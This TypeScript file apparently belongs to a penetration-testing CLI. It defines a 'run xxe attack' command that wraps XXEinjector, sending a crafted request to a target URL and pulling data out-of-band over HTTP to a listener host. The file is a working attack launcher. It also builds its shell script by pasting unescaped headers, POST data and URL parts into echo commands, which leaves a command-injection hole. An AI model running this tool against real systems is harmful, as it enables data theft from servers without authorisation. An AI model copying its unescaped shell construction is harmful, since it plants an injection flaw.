import { Command, Option } from "commander";
import { writeAIReport } from "../../lib/ai";
import { safe } from "../../lib/args";
import { runInContainer } from "../../lib/container";
import { createFileStream } from "../../lib/files";

export function register(cli: Command) {
  cli
    .description("run xxe attack (XXEinjector)")
    .version("1.0.0", "-V")
    .addHelpText(
      "afterAll",
      `\nTools: 
XXEinjector: https://github.com/enjoiz/XXEinjector`,
    )
    .addOption(new Option("--id <id>", "output file identifier"))
    .addOption(new Option("--ai", "generate AI report"))
    .addOption(
      new Option("-u, --url <url>", "* target url").makeOptionMandatory(),
    )
    .addOption(
      new Option("-X, --request <method>", "HTTP method")
        .choices(["GET", "POST", "PUT", "DELETE", "PATCH"])
        .default("GET"),
    )
    .addOption(new Option("-H, --header <header...>", "HTTP header(s)"))
    .addOption(new Option("-d, --data <data>", "HTTP POST data"))
    .addOption(new Option("--json", "flag data as JSON"))
    .addOption(new Option("--host <host>", "* host").makeOptionMandatory())
    .addOption(new Option("--flags-xeeinjector <flags>", "XXEinjector flags"))
    .action(
      async (opts: {
        id?: string;
        ai?: boolean;
        url: string;
        request: string;
        header?: string[];
        data?: string;
        json?: boolean;
        host: string;
        flagsXeeinjector?: string;
      }) => {
        // Setup
        const outputId = `web_xxe_${opts.id || opts.url}`;
        const [, file] = createFileStream(outputId);
        // Command
        let cmd = `figlet "Ni!" \n`;
        // URL file
        const url = new URL(opts.url);
        cmd += `echo "${opts.request} ${url.pathname}${url.search} HTTP/1.1" > /data/url.txt \n`;
        cmd += `echo "Host: ${url.host}" >> /data/url.txt \n`;
        opts.header?.forEach(
          (header) => (cmd += `echo "${header}" >> /data/url.txt \n`),
        );
        if (opts.json)
          cmd += `echo "Content-Type: application/json;charset=utf-8" >> /data/url.txt \n`;
        cmd += `echo "" >> /data/url.txt \n`;
        cmd += `echo "${opts.data || ""}" >> /data/url.txt \n`;
        // XXEinjector
        cmd += `figlet "XXEinjector" \n`;
        cmd += `cd /opt/apps/xxeinjector/ \n`;
        cmd += `ruby XXEinjector.rb ${opts.flagsXeeinjector || ""} --host="${safe(opts.host)}" --file=/data/url.txt --oob=http --phpfilter --xslt`;
        // Run
        const data = await runInContainer({
          outputId,
          cmd: cmd,
          stdout: process.stdout,
          fsout: file,
        });
        // AI
        if (opts.ai)
          await writeAIReport({ data, stdout: process.stdout, fsout: file });
      },
    );
}
